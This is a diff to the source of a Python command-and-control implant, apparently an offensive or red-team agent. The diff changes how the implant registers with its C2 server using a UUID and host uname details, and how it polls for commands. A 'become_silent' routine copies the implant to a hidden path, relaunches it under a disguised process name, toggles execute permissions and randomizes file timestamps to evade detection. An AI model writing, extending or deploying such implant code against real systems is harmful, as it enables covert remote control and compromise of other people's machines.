@@ -4,6 +4,7 @@ import subprocess
 import hashlib
 import os
 import sys
+import uuid
 
 import requests
 
@@ -35,7 +36,10 @@ def make_get(url):
 	Returns: the data decoded from base64
 
 	"""
-	r = requests.get(f"http://{HOST}:{PORT}/{url}")
+	try:
+		r = requests.get(f"http://{HOST}:{PORT}/{url}")
+	except ConnectionRefusedError:
+		return 400
 	return base64.urlsafe_b64decode(bytes(r.text.encode('utf-8'))).decode('utf-8')
 
 
@@ -88,8 +92,9 @@ def register():
 	Returns: make post request to C2 server
 	"""
 	uname = get_uname()
-	salt = generate_id()
-	code = make_post("register", f"{uname}:{salt}")
+	generate_id()
+	global c2_id
+	code = make_post("register", f"{uname}:{c2_id}")
 	if code == 200:
 		return True
 	return False
@@ -101,7 +106,8 @@ def request_commands():
 
 	Returns: the polling status and commands to execute
 	"""
-	data = make_get("commands").split()
+	global c2_id
+	data = make_get(f"{c2_id}/commands").split()
 	return data[0], data[1:]
 
 
@@ -124,7 +130,7 @@ def get_uname():
 
 	Returns: the string containing uname string
 	"""
-	return f"{os.uname().sysname} {os.uname().release} {os.uname().version} {os.uname().machine}"
+	return f"{os.uname().sysname} {os.uname().release} {os.uname().machine}"
 
 
 def generate_id():
@@ -134,9 +140,7 @@ def generate_id():
 
 	"""
 	global c2_id
-	salt = random.randint(1, 10000)
-	c2_id = int(hashlib.sha1(get_uname().encode("utf-8")).hexdigest(), 16) + salt
-	return salt
+	c2_id = uuid.uuid4().int
 
 
 def run_builtin(command):
@@ -230,8 +234,6 @@ def become_silent():
 	Returns:
 
 	"""
-	# p = psutil.Process(os.getpid())
-	# cmdline = p.cmdline()[1]
 
 	cmdline = sys.argv[0]
 
@@ -240,10 +242,9 @@ def become_silent():
 	if not check_mark() and cmdline != hidden:
 		leave_mark()
 		print("No presence detected, going in...")
-
 		shutil.copyfile(cmdline, hidden)
 		subprocess.run(["/bin/chmod", "+x", f"{hidden}"])
-		subprocess.run(shlex.split(f"bash -c \"exec -a {bandit} {os.path.realpath(__file__)} {hidden} &\""))
+		subprocess.run(shlex.split(f"bash -c \"exec -a {bandit} {sys.executable} {hidden} &\""))
 		subprocess.run(["/bin/chmod", "-x", f"{hidden}"])
 		randomize_timestamp(hidden)
 		print("Killing overt agent...")
